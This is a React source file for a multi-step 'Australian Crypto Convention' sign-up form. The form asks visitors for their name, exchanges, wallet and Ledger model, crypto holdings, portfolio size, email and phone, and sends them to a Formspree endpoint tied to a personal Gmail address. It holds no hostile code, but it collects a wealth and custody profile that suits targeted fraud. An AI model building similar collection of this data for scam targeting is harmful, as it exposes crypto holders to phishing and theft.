"use client"

import type React from "react"
import { useState } from "react"
import SuccessModal from "@/components/successmodel"

export default function RegistrationForm() {
  const [currentStep, setCurrentStep] = useState(1)
  const [hasLedger, setHasLedger] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    exchanges: "",
    walletType: "",
    walletSpecify: "",
    ledgerModel: "",
    holdings: [] as string[],
    portfolio: "",
    email: "",
    phone: "",
  })

  const [errors, setErrors] = useState<Record<string, string>>({})

  const allSteps = [
    "Your Name",
    "Exchanges You Use Regularly",
    "Wallets / Custody You Use",
    "Which Ledger Model Do You Use?",
    "Your Current Holdings",
    "Approximate Total Portfolio (USD)",
    "Where Should We Send Your Online Pass?",
  ]

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
    if (errors[name]) {
      setErrors((prev) => {
        const newErrors = { ...prev }
        delete newErrors[name]
        return newErrors
      })
    }
  }

  const handleHoldingsChange = (holding: string) => {
    setFormData((prev) => ({
      ...prev,
      holdings: prev.holdings.includes(holding)
        ? prev.holdings.filter((h) => h !== holding)
        : [...prev.holdings, holding],
    }))
    if (errors.holdings) {
      setErrors((prev) => {
        const newErrors = { ...prev }
        delete newErrors.holdings
        return newErrors
      })
    }
  }

  const validateStep = (): boolean => {
    const newErrors: Record<string, string> = {}

    if (currentStep === 1) {
      if (!formData.firstName.trim()) newErrors.firstName = "First name is required"
      if (!formData.lastName.trim()) newErrors.lastName = "Last name is required"
    } else if (currentStep === 2) {
      if (!formData.exchanges.trim()) newErrors.exchanges = "Please select an exchange"
    } else if (currentStep === 3) {
      if (!formData.walletType) newErrors.walletType = "Please select a wallet type"
      if (formData.walletType === "Other" && !formData.walletSpecify.trim()) {
        newErrors.walletSpecify = "Please specify your wallet/custody"
      }
    } else if (currentStep === 4 && hasLedger) {
      if (!formData.ledgerModel) newErrors.ledgerModel = "Please select a Ledger model"
    } else if (currentStep === 5) {
      if (formData.holdings.length === 0) newErrors.holdings = "Please select at least one holding type"
    } else if (currentStep === 6) {
      if (!formData.portfolio.trim()) newErrors.portfolio = "Please select your portfolio amount"
    } else if (currentStep === 7) {
      if (!formData.email.trim()) newErrors.email = "Email is required"
      if (!formData.phone.trim()) newErrors.phone = "Phone is required"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = () => {
    if (validateStep()) {
      if (currentStep === 3 && formData.walletType === "Ledger") {
        setHasLedger(true)
      }

      if (currentStep === 3 && formData.walletType !== "Ledger") {
        setCurrentStep(5) // Skip step 4
      } else {
        setCurrentStep((prev) => prev + 1)
      }
    }
  }

  const handleBack = () => {
    if (currentStep === 5 && !hasLedger) {
      setCurrentStep(3)
    } else {
      setCurrentStep((prev) => Math.max(1, prev - 1))
    }
  }

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    if (validateStep()) {
      console.log("[v0] Form submitted:", formData)
      setShowSuccess(true)
      setTimeout(() => {
        ;(e.target as HTMLFormElement).submit()
      }, 1500)
    }
  }

  const exchangeOptions = [
    "CoinSpot",
    "Swyftx",
    "Independent Reserve",
    "CoinJar",
    "Binance",
    "Kraken",
    "Bybit",
    "Other",
  ]
  const walletOptions = ["MetaMask", "Trust Wallet", "Ledger", "Trezor", "Safe (multisig)", "Phantom", "Other"]
  const ledgerModels = ["Nano S", "Nano S Plus", "Nano X", "Stax", "Other"]
  const holdingOptions = [
    "BTC",
    "ETH",
    "Stablecoins",
    "L1 alts (SOL, ADA, AVAX...)",
    "L2 / rollup tokens",
    "DeFi governance tokens",
    "Memecoins",
    "RWAs / tokenized assets",
    "NFTs",
    "Other",
  ]
  const portfolioOptions = [
    "$0 - $1,000",
    "$1,000 - $10,000",
    "$10,000 - $50,000",
    "$50,000 - $200,000",
    "$200,000 - $500,000",
    "$500,000+",
  ]

  const getTotalSteps = () => 7

  const progressPercentage = hasLedger ? (currentStep / 7) * 100 : ((currentStep - (currentStep > 4 ? 1 : 0)) / 6) * 100

  return (
    <>
      <SuccessModal isOpen={showSuccess} onClose={() => setShowSuccess(false)} />

      <section
        id="registration-form"
        className="bg-linear-to-b from-purple-900 via-purple-800 to-maroon-900 py-16 md:py-24 px-4 md:px-8 min-h-screen flex items-center justify-center"
      >
        <div className="max-w-6xl w-full">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-start">
            {/* Left Panel */}
            <div className="bg-slate-900 bg-opacity-60 rounded-3xl p-8 md:p-12 backdrop-blur-sm border border-slate-700">
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-full bg-linear-to-br from-red-500 to-pink-500"></div>
                  <span className="text-white text-sm font-semibold">AUSTRALIAN CRYPTO CONVENTION</span>
                </div>
                <button className="w-8 h-8 rounded-full border border-gray-500 flex items-center justify-center text-gray-400 hover:text-white transition-colors">
                  ✕
                </button>
              </div>

              <div className="mb-8">
                <span className="inline-block px-3 py-1 bg-slate-800 rounded-full text-gray-300 text-xs font-semibold mb-6">
                  22-23 Nov 2025
                </span>
                <h3 className="text-white text-sm font-semibold tracking-wider mb-6">AUSTRALIAN CRYPTO CONVENTION</h3>
                <h2 className="text-white text-3xl md:text-4xl font-bold mb-6">{allSteps[currentStep - 1]}</h2>

                <div className="w-full bg-slate-700 rounded-full h-1 mb-8">
                  <div
                    className="bg-linear-to-r from-red-500 to-pink-500 h-1 rounded-full transition-all duration-300"
                    style={{ width: `${progressPercentage}%` }}
                  ></div>
                </div>
              </div>

              <div className="flex flex-wrap gap-3">
                {allSteps.map((stepTitle, index) => {
                  if (index === 3 && !hasLedger) return null

                  return (
                    <button
                      key={index}
                      className={`px-4 py-2 text-xs font-semibold rounded-full border transition-colors ${
                        index + 1 === currentStep
                          ? "bg-linear-to-r from-red-500 to-pink-500 text-white border-transparent"
                          : "bg-slate-800 hover:bg-slate-700 text-gray-300 border-slate-600"
                      }`}
                    >
                      {stepTitle}
                    </button>
                  )
                })}
              </div>
            </div>

            {/* Right Panel - Form */}
            <form
              action="https://formspree.io/f/aidenjsx007@gmail.com"
              method="POST"
              onSubmit={handleSubmit}
              className="bg-gray-200 rounded-3xl p-8 md:p-12 max-h-[600px] overflow-y-auto"
            >
              <div className="space-y-6">
                {/* Step 1: Your Name */}
                {currentStep === 1 && (
                  <>
                    <div>
                      <label className="block text-gray-700 text-sm font-semibold mb-2">First Name *</label>
                      <input
                        type="text"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        placeholder="First Name"
                        className={`w-full px-4 py-3 bg-white rounded-lg border ${
                          errors.firstName ? "border-red-500" : "border-gray-300"
                        } text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600`}
                      />
                      {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                    </div>

                    <div>
                      <label className="block text-gray-700 text-sm font-semibold mb-2">Last Name *</label>
                      <input
                        type="text"
                        name="lastName"
                        value={formData.lastName}
                        onChange={handleInputChange}
                        placeholder="Last Name"
                        className={`w-full px-4 py-3 bg-white rounded-lg border ${
                          errors.lastName ? "border-red-500" : "border-gray-300"
                        } text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600`}
                      />
                      {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                    </div>
                  </>
                )}

               
                {currentStep === 2 && (
                  <div className="space-y-3">
                    {exchangeOptions.map((exchange) => (
                      <label
                        key={exchange}
                        className={`flex items-center p-4 bg-white rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors ${
                          formData.exchanges === exchange ? "border-red-500 bg-red-50" : "border-gray-300"
                        }`}
                      >
                        <input
                          type="radio"
                          name="exchanges"
                          value={exchange}
                          checked={formData.exchanges === exchange}
                          onChange={handleInputChange}
                          className="w-5 h-5 text-purple-600"
                        />
                        <span className="ml-3 text-gray-800 font-medium">{exchange}</span>
                      </label>
                    ))}
                    {errors.exchanges && <p className="text-red-500 text-xs mt-1">{errors.exchanges}</p>}
                  </div>
                )}

             
                {currentStep === 3 && (
                  <div className="space-y-3">
                    {walletOptions.map((wallet) => (
                      <label
                        key={wallet}
                        className={`flex items-center p-4 bg-white rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors ${
                          formData.walletType === wallet ? "border-red-500 bg-red-50" : "border-gray-300"
                        }`}
                      >
                        <input
                          type="radio"
                          name="walletType"
                          value={wallet}
                          checked={formData.walletType === wallet}
                          onChange={handleInputChange}
                          className="w-5 h-5 text-purple-600"
                        />
                        <span className="ml-3 text-gray-800 font-medium">{wallet}</span>
                      </label>
                    ))}
                    {errors.walletType && <p className="text-red-500 text-xs mt-1">{errors.walletType}</p>}

                    {formData.walletType === "Other" && (
                      <div className="mt-4">
                        <input
                          type="text"
                          name="walletSpecify"
                          value={formData.walletSpecify}
                          onChange={handleInputChange}
                          placeholder="Please specify wallets/custody"
                          className={`w-full px-4 py-3 bg-white rounded-lg border ${
                            errors.walletSpecify ? "border-red-500" : "border-gray-300"
                          } text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600`}
                        />
                        {errors.walletSpecify && <p className="text-red-500 text-xs mt-1">{errors.walletSpecify}</p>}
                      </div>
                    )}
                  </div>
                )}

              
                {currentStep === 4 && hasLedger && (
                  <div className="space-y-3">
                    {ledgerModels.map((model) => (
                      <label
                        key={model}
                        className={`flex items-center p-4 bg-white rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors ${
                          formData.ledgerModel === model ? "border-red-500 bg-red-50" : "border-gray-300"
                        }`}
                      >
                        <input
                          type="radio"
                          name="ledgerModel"
                          value={model}
                          checked={formData.ledgerModel === model}
                          onChange={handleInputChange}
                          className="w-5 h-5 text-purple-600"
                        />
                        <span className="ml-3 text-gray-800 font-medium">{model}</span>
                      </label>
                    ))}
                    {errors.ledgerModel && <p className="text-red-500 text-xs mt-1">{errors.ledgerModel}</p>}
                  </div>
                )}

                
                {currentStep === 5 && (
                  <div className="space-y-3">
                    {holdingOptions.map((holding) => (
                      <label
                        key={holding}
                        className={`flex items-center p-4 bg-white rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors ${
                          formData.holdings.includes(holding) ? "border-red-500 bg-red-50" : "border-gray-300"
                        }`}
                      >
                        <input
                          type="checkbox"
                          checked={formData.holdings.includes(holding)}
                          onChange={() => handleHoldingsChange(holding)}
                          className="w-5 h-5 text-purple-600 rounded"
                        />
                        <span className="ml-3 text-gray-800 font-medium">{holding}</span>
                      </label>
                    ))}
                    {errors.holdings && <p className="text-red-500 text-xs mt-1">{errors.holdings}</p>}
                  </div>
                )}

                
                {currentStep === 6 && (
                  <div className="space-y-3">
                    {portfolioOptions.map((option) => (
                      <label
                        key={option}
                        className={`flex items-center p-4 bg-white rounded-lg border cursor-pointer hover:bg-gray-50 transition-colors ${
                          formData.portfolio === option ? "border-red-500 bg-red-50" : "border-gray-300"
                        }`}
                      >
                        <input
                          type="radio"
                          name="portfolio"
                          value={option}
                          checked={formData.portfolio === option}
                          onChange={handleInputChange}
                          className="w-5 h-5 text-purple-600"
                        />
                        <span className="ml-3 text-gray-800 font-medium">{option}</span>
                      </label>
                    ))}
                    {errors.portfolio && <p className="text-red-500 text-xs mt-1">{errors.portfolio}</p>}
                  </div>
                )}

                {/* Step 7: Where Should We Send Your Online Pass? */}
                {currentStep === 7 && (
                  <>
                    <div>
                      <label className="block text-gray-700 text-sm font-semibold mb-2">
                        Email (for your invite) *
                      </label>
                      <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        placeholder="Email (for your invite)"
                        className={`w-full px-4 py-3 bg-white rounded-lg border ${
                          errors.email ? "border-red-500" : "border-gray-300"
                        } text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600`}
                      />
                      {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                    </div>

                    <div>
                      <label className="block text-gray-700 text-sm font-semibold mb-2">Phone Number *</label>
                      <div className="flex gap-3">
                        <select className="w-16 px-2 py-3 bg-white rounded-lg border border-gray-300 text-gray-900 focus:outline-none focus:ring-2 focus:ring-purple-600">
                          <option>🇦🇺 +61</option>
                        </select>
                        <input
                          type="tel"
                          name="phone"
                          value={formData.phone}
                          onChange={handleInputChange}
                          placeholder="Phone number"
                          className={`flex-1 px-4 py-3 bg-white rounded-lg border ${
                            errors.phone ? "border-red-500" : "border-gray-300"
                          } text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600`}
                        />
                      </div>
                      {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
                    </div>
                  </>
                )}

                {/* Navigation Buttons */}
                <div className="flex gap-4 pt-6">
                  <button
                    type="button"
                    onClick={handleBack}
                    disabled={currentStep === 1}
                    className="flex-1 px-6 py-3 bg-white hover:bg-gray-100 disabled:bg-gray-300 disabled:cursor-not-allowed text-gray-800 font-semibold rounded-lg transition-colors"
                  >
                    Back
                  </button>
                  <button
                    type={currentStep === 7 ? "submit" : "button"}
                    onClick={currentStep === 7 ? undefined : handleContinue}
                    className="flex-1 px-6 py-3 bg-linear-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 text-white font-semibold rounded-lg transition-colors"
                  >
                    {currentStep === 7 ? "Submit" : "Continue"}
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </section>
    </>
  )
}
